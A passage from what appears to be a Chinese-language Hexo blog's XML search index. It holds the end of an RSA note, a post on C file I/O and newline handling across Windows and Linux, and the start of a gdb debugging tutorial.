n</li><li>解密公式为：m &#x3D; c^e^ mod n</li></ul><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/cybersec/03.png" alt="03"></p><p>证明过程如下，这个证明过程是先通过上面的硬过程得到<code>e</code>和<code>d</code>，然后再证明这个<code>e</code>和<code>d</code>具有加密和解密功能的正确性。</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/cybersec/04.png" alt="04"></p><p>从公式中，通过交换律可以看出，<code>e</code>和<code>d</code>的位置是可以互换的。<code>m</code>是先<code>e</code>再<code>d</code>，还是先<code>e</code>再<code>d</code>的结果是一样的，也就是说哦<code>m</code>用<code>e</code>加密也行，用<code>d</code>加密也行，反正最后它们都能通过另一个数解密出正确的<code>m</code>。</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/cybersec/05.png" alt="05"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言文件操作</title>
      <link href="/2024/07/20/C%E8%AF%AD%E8%A8%80%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
      <url>/2024/07/20/C%E8%AF%AD%E8%A8%80%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/m0_69519887/article/details/133678342">c语言文件操作详解：fgetc,fputc,fgets,fputs,fscanf,,fprintf,fread,fwrite的使用和区别-CSDN博客</a></p><p><a href="https://www.cnblogs.com/kangjianwei101/p/5220021.html">C语言中文件打开模式(r&#x2F;w&#x2F;a&#x2F;r+&#x2F;w+&#x2F;a+&#x2F;rb&#x2F;wb&#x2F;ab&#x2F;rb+&#x2F;wb+&#x2F;ab+)浅析 - 康建伟 - 博客园 (cnblogs.com)</a></p><p><a href="https://www.runoob.com/cprogramming/c-standard-library-stdio-h.html">C 标准库 –  | 菜鸟教程 (runoob.com)</a></p><p>关于<code>FILE</code>结构体，这是C语言库自己定义的一个描述文件信息的结构体，底层逻辑肯定还是<code>linux</code>那一套，只不过这个结构体对操作系统的这个表记录的信息大概的汇总了一些。C语言的文件操作函数具体的实现方式可能是调用<code>linux</code>提供的<code>open、write</code>这些内核调用函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">iobuf</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *_ptr;         <span class="comment">// 指向当前缓冲区位置的指针</span></span><br><span class="line">    <span class="type">int</span> _cnt;           <span class="comment">// 缓冲区中剩余的字符数</span></span><br><span class="line">    <span class="type">char</span> *_base;        <span class="comment">// 缓冲区的起始地址</span></span><br><span class="line">    <span class="type">int</span> _flag;          <span class="comment">// 文件状态标志</span></span><br><span class="line">    <span class="type">int</span> _file;          <span class="comment">// 文件描述符</span></span><br><span class="line">    <span class="type">int</span> _charbuf;       <span class="comment">// 单字符缓冲区处理变量</span></span><br><span class="line">    <span class="type">int</span> _bufsiz;        <span class="comment">// 缓冲区的大小</span></span><br><span class="line">    <span class="type">char</span> *_tmpfname;    <span class="comment">// 临时文件名的指针</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">iobuf</span> <span class="title">FILE</span>;</span></span><br></pre></td></tr></table></figure><p><img src="/../posts_img/C%E8%AF%AD%E8%A8%80%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/02.png" alt="02"></p><p>关于文件结束符 <strong>EOF</strong>，这通常是一个文件操作函数的返回值，当文件操作函数运行出错或者文件读取到结尾时会返回这个值。<strong>EOF <strong>的值通常是 <code>-1</code>，在计算机中用补码表示。关于文件操作函数如何判断已经读取到文件结尾，应该是通过比较<code>struct file</code>中的</strong>文件偏移量</strong><code>f_pos</code>和<code>inode</code>中的<strong>文件长度</strong><code>i_size</code>得出的如果<code>f_pos == i_size</code>也就说明这个文件已经读取到结尾了，再往后就没有东西了，于是就返回<strong>EOF</strong>告知调用者已经没东西可以读取了。</p><p><code>int fgetc(FILE* fp)</code>函数读取文件指针(f_pos)指向的字节，返回这个字节的<code>int</code>，同时文件指针往后移一个。</p><p><code>char* fgets(char* buf, int size, FILE* fp)</code>函数从文件指针指向的地方开始读取，一直读取到换行符结束，也就是读取文本的一行到缓冲区。换行符经过处理后也会放入<code>buf</code>中，如何处理视平台差异不同。然后文件指针指向换行符的下一个字节，准备从下一行开始读取。函数会返回缓冲区的地址也就是传入的<code>buf</code>。最后函数在读取完后，会在<code>buf</code>已读取的字节后面加个<code>\0</code>表示一个完整的字符串。所以，这个函数在没有遇到换行符或者文件结束符前最多会读取<code>size - 1</code>个字节，预留一个字节用来放<code>\0</code>。一般来说<code>size</code>传入<code>sizeof(buf)</code>就行了。</p><p><code>fscanf()</code>函数是从文件指针处开始匹配，也就是说文件指针开始的字符串格式要与给定的格式相同，否则匹配不成功</p><p>注意所有文件操作函数都是基于文件指针的，也就是说读写操作都会从文件指针开始。</p><p>同样的一段文本，分别用<code>windows</code>的文本编辑器和<code>linux</code>的文本编辑器，最终保存的字节码会有所不同，主要区别还是在换行符上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hello world</span><br><span class="line">nihao shijie</span><br><span class="line">hello shijie</span><br></pre></td></tr></table></figure><p>前两行的结尾都只用了一个回车，最后一行的结尾没有回车。这段文本在<code>windows</code>下编辑并保存为<code>windows.txt</code>，在<code>linux</code>下编辑并保存为<code>linux.txt</code>，最后保存的字节码分别用<code>hexdump</code>工具查看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C windows.txt</span><br><span class="line">00000000  68 65 6c 6c 6f 20 77 6f  72 6c 64 0d 0a 6e 69 68  |hello world..nih|</span><br><span class="line">00000010  61 6f 20 73 68 69 6a 69  65 0d 0a 68 65 6c 6c 6f  |ao shijie..hello|</span><br><span class="line">00000020  20 73 68 69 6a 69 65                              | shijie|</span><br><span class="line">00000027</span><br><span class="line"></span><br><span class="line">hexdump -C linux.txt </span><br><span class="line">00000000  68 65 6c 6c 6f 20 77 6f  72 6c 64 0a 6e 69 68 61  |hello world.niha|</span><br><span class="line">00000010  6f 20 73 68 69 6a 69 65  0a 68 65 6c 6c 6f 20 73  |o shijie.hello s|</span><br><span class="line">00000020  68 69 6a 69 65 0a                                 |hijie.|</span><br><span class="line">00000026</span><br></pre></td></tr></table></figure><p>我们知道<code>windows</code>平台下用<code>\r\n</code>表示换行符，<code>linux</code>平台下用<code>\n</code>表示换行符，这是造成以上两段字节码中间两个换行符不同的原因，此外<code>windows</code>在文本的结尾处不会额外添加换行符，但是<code>linux</code>在文本的结尾会额外添加换行符，即使我没有打回车。</p><p>好的，上面展示的就是两个平台下生成的两个文件各自真是的字节码。那么<code>C语言</code>是如何处理这种不同平台下产生的文本文件的差异呢。</p><p>给出以下源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* buf, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, buf[i]);</span><br><span class="line">        j = (j + <span class="number">1</span>) % <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* buf, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        buf[i] = <span class="number">0xcc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> win_buf[<span class="number">50</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> linux_buf[<span class="number">50</span>];</span><br><span class="line">    init(win_buf, <span class="keyword">sizeof</span>(win_buf));</span><br><span class="line">    init(linux_buf, <span class="keyword">sizeof</span>(linux_buf));</span><br><span class="line"></span><br><span class="line">    FILE* win_fp = fopen(<span class="string">&quot;windows.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    FILE* linux_fp = fopen(<span class="string">&quot;linux.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; (ch = fgetc(win_fp)) != EOF; i++)</span><br><span class="line">        win_buf[i] = ch;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; (ch = fgetc(linux_fp)) != EOF; i++)</span><br><span class="line">        linux_buf[i] = ch;</span><br><span class="line"></span><br><span class="line">    fclose(win_fp);</span><br><span class="line">    fclose(linux_fp);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;win_buf:\n&quot;</span>);</span><br><span class="line">    print(win_buf, <span class="keyword">sizeof</span>(win_buf));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;linux_buf:\n&quot;</span>);</span><br><span class="line">    print(linux_buf, <span class="keyword">sizeof</span>(linux_buf));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码的逻辑很简单，就是分别读取<code>windows.txt</code>和<code>linux.txt</code>中的内容到<code>win_buf</code>和<code>linux_buf</code>中。两个<code>buf</code>在一开始就将每个字节初始化为<code>cc</code>，这样最终输出的时候可以比较明显的进行比较</p><p>还需要说明的是，不同平台下的<code>C语言</code>在文件处理时对待换行符的操作也不同。换句话说，上面同样的代码，我在<code>windows</code>平台下和<code>linux</code>平台下运行的结果是不同的。首先，我将在<code>windows</code>平台下运行上面代码。运行的结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">win_buf:</span><br><span class="line">68 65 6c 6c 6f 20 77 6f 72 6c </span><br><span class="line">64 0a 6e 69 68 61 6f 20 73 68 </span><br><span class="line">69 6a 69 65 0a 68 65 6c 6c 6f </span><br><span class="line">20 73 68 69 6a 69 65 cc cc cc </span><br><span class="line">cc cc cc cc cc cc cc cc cc cc </span><br><span class="line">linux_buf:</span><br><span class="line">68 65 6c 6c 6f 20 77 6f 72 6c </span><br><span class="line">64 0a 6e 69 68 61 6f 20 73 68 </span><br><span class="line">69 6a 69 65 0a 68 65 6c 6c 6f </span><br><span class="line">20 73 68 69 6a 69 65 0a cc cc </span><br><span class="line">cc cc cc cc cc cc cc cc cc cc </span><br></pre></td></tr></table></figure><p>不难发现，除了<code>linux.txt</code>本身结尾就有一个<code>\n</code>换行符不用在意之外，中间两个换行符在数组中都是<code>0a</code>，也就是<code>\n</code>的存在。从此，可以得出结论，<code>windows</code>平台下<code>C语言</code>中，在文本模式下，<code>C语言</code>会将从文本读取到的换行符统一为<code>\n</code>，也就是说不管是原先<code>windows</code>平台下的<code>0d 0a</code>还是<code>linux</code>平台下的<code>0a</code>在<code>C语言</code>中都会被处理成<code>0a</code>。<br>但是如果是二进制模式(<code>rb</code>)的情况下，肯定还是保持原来文本文件的字节码，该是<code>0d 0a</code>读进来还是<code>0d 0a</code>。</p><p><img src="/../posts_img/C%E8%AF%AD%E8%A8%80%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/01.png" alt="01"></p><p>以上是<code>C语言</code>在<code>windows</code>平台下以文本模式读取文件遇到换行符的操作。在<code>linux</code>平台下，这个操作会有不同，甚至让人迷惑。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">win_buf:</span><br><span class="line">68 65 6c 6c 6f 20 77 6f 72 6c </span><br><span class="line">64 0d 0a 6e 69 68 61 6f 20 73 </span><br><span class="line">68 69 6a 69 65 0d 0a 68 65 6c </span><br><span class="line">6c 6f 20 73 68 69 6a 69 65 cc </span><br><span class="line">cc cc cc cc cc cc cc cc cc cc </span><br><span class="line">linux_buf:</span><br><span class="line">68 65 6c 6c 6f 20 77 6f 72 6c </span><br><span class="line">64 0a 6e 69 68 61 6f 20 73 68 </span><br><span class="line">69 6a 69 65 0a 68 65 6c 6c 6f </span><br><span class="line">20 73 68 69 6a 69 65 0a cc cc </span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br></pre></td></tr></table></figure><p><code>linux</code>平台下的<code>C语言</code>在文本读模式的情况下并不会对换行符进行一个统一操作，原来该是什么字节还是什么字节。跟二进制读模式一样。虽然不知道为什么，但是还是有必要知道这个差异的存在。</p><p>此外，如果用<code>fgets()</code>函数代替<code>ch</code>遍历读取两个文件的第一行，在文本模式下对行尾换行符的处理也是一样的。<code>windows</code>平台下的<code>C语言</code>会进行统一处理，<code>linux</code>平台下的<code>C语言</code>不会进行统一，原来是什么样读取时不会处理，还是什么样。</p><p>以下是<code>windows</code>平台下的处理结果如下，可以发现都是<code>0a</code>也就是<code>\n</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">win_buf:</span><br><span class="line">68 65 6c 6c 6f 20 77 6f 72 6c</span><br><span class="line">64 0a 00 cc cc cc cc cc cc cc</span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">linux_buf:</span><br><span class="line">68 65 6c 6c 6f 20 77 6f 72 6c</span><br><span class="line">64 0a 00 cc cc cc cc cc cc cc</span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br></pre></td></tr></table></figure><p>以下是<code>linux</code>平台下的处理结果，可以发现对于<code>windows.txt</code>的换行符仍然还是<code>0d 0a</code>也就是<code>\r\n</code>，对于<code>linux.txt</code>的换行符也仍然是<code>0a</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">win_buf:</span><br><span class="line">68 65 6c 6c 6f 20 77 6f 72 6c </span><br><span class="line">64 0d 0a 00 cc cc cc cc cc cc </span><br><span class="line">cc cc cc cc cc cc cc cc cc cc </span><br><span class="line">cc cc cc cc cc cc cc cc cc cc </span><br><span class="line">cc cc cc cc cc cc cc cc cc cc </span><br><span class="line">linux_buf:</span><br><span class="line">68 65 6c 6c 6f 20 77 6f 72 6c </span><br><span class="line">64 0a 00 cc cc cc cc cc cc cc </span><br><span class="line">cc cc cc cc cc cc cc cc cc cc </span><br><span class="line">cc cc cc cc cc cc cc cc cc cc </span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br></pre></td></tr></table></figure><p><img src="/../posts_img/C%E8%AF%AD%E8%A8%80%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/00.png" alt="00"></p>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gdb的使用</title>
      <link href="/2024/07/17/gdb%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/07/17/gdb%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>在使用<code>gdb</code>调试程序之前，需要用<code>gcc</code>根据源代码生成可调试的二进制程序。一般生成的可执行程序因为没有调试信息所以<code>gdb</code>无法调试，因为有了调试信息，所以可调式的二进制程序会比没有调试信息的二进制程序的大小要大一些。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">gcc -g *.c -o a</span></span><br></pre></td></tr></table></figure><p>像这样就可生成可调试的二进制程序，但是可以用<code>-O0 -Wall</code>参数把生成的代码优化参数调到最低，并显示一些警告信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g *.c -o a -O0 -Wall</span><br></pre></td></tr></table></figure><p>这个过程其实和正常编译一个<code>C</code>文件差不多。如果是<code>C++</code>文件的话，将<code>gcc</code>换成<code>g++</code>就好了。</p><p>使用<code>gdb a</code>命令就可以进入<code>gdb</code>调试前面生成的程序<code>a</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">gdb a</span></span><br><span class="line">GNU gdb (Debian 13.2-1+b2) 13.2</span><br><span class="line">Copyright (C) 2023 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type &quot;show copying&quot; and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from a...</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure><p>注意这只是进入了<code>gdb</code>，并将程序<code>a</code>加载到了<code>gdb</code>中，这时候<code>a</code>程序还没有被执行。</p><p>有些程序执行时需要输入命令行参数，但是用<code>gdb</code>调试时没有输入命令行参数，这时用以下两个命令分别设置命令行参数和查看命令行参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) set args 1 2 3 4 # 想放几个参数放几个</span><br><span class="line">(gdb) show args</span><br><span class="line">Argument list to give program being debugged when it is started is &quot;1 2 3 4&quot;.</span><br></pre></td></tr></table></figure><ul><li><p><code>start</code>: 启动程序, 最终会阻塞在main函数的第一行，等待输入后续其它 <code>gdb</code> 指令</p></li><li><p><code>run</code>: 可以缩写为 r, 如果程序中设置了断点会停在第一个断点的位置, 如果没有设置断点, 程序就执行完了。与<code>continue</code>不同的是，这时程序执行之前调用的命令</p></li><li><p><code>quit</code>: 可以缩写为<code>q</code>，退出 <code>gdb</code></p></li></ul><p><code>list</code>命令用于显示源代码，具体使用如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 list 和使用 l 都可以</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从第一行开始显示</span></span><br><span class="line">(gdb) list </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列值这行号对应的上下文代码, 默认情况下只显示10行内容</span></span><br><span class="line">(gdb) list 行号</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示这个函数的上下文内容, 默认显示10行</span></span><br><span class="line">(gdb) list 函数名</span><br></pre></td></tr></table></figure><p>此外，<code>gdb</code>默认定位在<code>main</code>函数所在的文件中，用<code>list</code>命令不仅可以显示其它文件中的代码，还可以切换到其它文件，格式如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到指定的文件，并列出这行号对应的上下文代码, 默认情况下只显示10行内容</span></span><br><span class="line">(gdb) l 文件名:行号</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到指定的文件，并显示这个函数的上下文内容, 默认显示10行</span></span><br><span class="line">(gdb) l 文件名:函数名</span><br></pre></td></tr></table></figure><p>注意这个冒号就固定的跟文件名搭配使用好了，虽然放在函数名后也能生效，但其实跟不加冒号一样。</p><p><code>gdb</code>默认<code>list</code>显示的行数为<code>10</code>行，用以下命令可以设置显示的行数和查看当前显示的行数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以下两个命令中的 listsize 都可以写成 list</span></span><br><span class="line">(gdb) set listsize 行数</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前list一次显示的行数</span></span><br><span class="line">(gdb) show listsize</span><br></pre></td></tr></table></figure><hr><ul><li><code>break</code>，缩写为<code>b</code>，用来打断点，具体使用情况如下</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在当前文件的某一行上设置断点</span></span><br><span class="line">(gdb) break 行号</span><br><span class="line">(gdb) b 函数名# 停止在函数的第一行</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在非当前文件的某一行上设置断点</span></span><br><span class="line">(gdb) b 文件名:行号</span><br><span class="line">(gdb) b 文件名:函数名# 停止在函数的第一行</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">必须要满足某个条件, 程序才会停在这个断点的位置上</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通常情况下, 在循环中条件断点用的比较多</span></span><br><span class="line">(gdb) b 行数 if 变量名==某个值</span><br></pre></td></tr></table></figure><ul><li><code>info</code>，缩写为<code>i</code>，可以查看一些信息。比如<code>break</code>会为每个断点打上一个编号，用<code>info break</code>可以查看我们之前给哪些地方打了断点，并查看其详细信息</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(gdb) i b   #info break</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">举例</span></span><br><span class="line">(gdb) i b</span><br><span class="line">Num     Type           Disp Enb Address            What</span><br><span class="line">1       breakpoint     keep y   0x0000000000400cb5 in main() at test.cpp:12</span><br><span class="line">2       breakpoint     keep y   0x0000000000400cbd in main() at test.cpp:13</span><br><span class="line">3       breakpoint     keep y   0x0000000000400cec in main() at test.cpp:18</span><br><span class="line">4       breakpoint     keep y   0x00000000004009a5 in insertionSort(int*, int) </span><br><span class="line">                                                   at insert.cpp:8</span><br><span class="line">5       breakpoint     keep y   0x0000000000400cdd in main() at test.cpp:16</span><br><span class="line">6       breakpoint     keep y   0x00000000004009e5 in insertionSort(int*, int) </span><br><span class="line">                                                   at insert.cpp:16</span><br></pre></td></tr></table></figure><ol><li><p><code>Num</code>: 断点的编号, 删除断点或者设置断点状态的时候都需要使用</p></li><li><p><code>Enb</code>: 当前断点的状态, y表示断点可用, n表示断点不可用</p></li><li><p><code>What:</code> 描述断点被设置在了哪个文件的哪一行或者哪个函数上</p></li></ol><ul><li><code>delete</code>，缩写为<code>del</code>或<code>d</code>，可以用来删除某个断点，注意这个操作是不可逆的，而且断点编号不会因此调整，也就是说断点的编号中间可能会空了一个数</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">举例</span></span><br><span class="line">(gdb) d 1          # 删除第1个断点</span><br><span class="line">(gdb) d 2 4 6      # 删除第2,4,6个断点</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除一个范围, 断点编号 num1 - numN 是一个连续区间</span></span><br><span class="line">(gdb) d num1-numN</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">举例, 删除第1到第5个断点</span></span><br><span class="line">(gdb) d 1-5</span><br></pre></td></tr></table></figure><ul><li><code>disable</code>，缩写为<code>dis</code>，如果不想让某个断点生效，又不想删除这个断点就可以使用这个命令让断点失效，它会修改断点的<code>Enb</code>属性为<code>n</code></li><li><code>enable</code>，缩写为<code>ena</code>，与<code>disable</code>对应，让失效的断点恢复有效状态</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 